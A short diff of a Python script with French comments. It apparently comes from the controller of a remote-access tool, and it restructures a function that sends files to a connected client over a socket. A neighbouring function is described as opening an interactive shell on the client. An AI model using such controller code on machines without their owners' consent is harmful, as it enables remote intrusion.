@@ -28,11 +28,11 @@ def upload(client_socket):
                 print("[!] Fichier introuvable")
                 client_socket.send(b'Fichier introuvable')
             else:
-                client_socket.send(b'upload') # Envoie de la commande
-                client_socket.send(filename.encode()) #Envoi du nom du fichier
-                requete_recue = client_socket.recv(4096).decode() # Récupération des résultats
-                print(f"Le fichier a bien été upload sous le chemin suivant : ")
-        break
+                break
+    client_socket.send(b'upload') # Envoie de la commande
+    client_socket.send(filename.encode()) #Envoi du nom du fichier
+    requete_recue = client_socket.recv(4096).decode() # Récupération des résultats
+    print(f"Les fichiers {requete_recue} ont bien été upload sous le chemin suivant : ")
     
 # Fonction permettant d'initier un shell intéractif sur le client
 def shell(client_socket, client_ip):
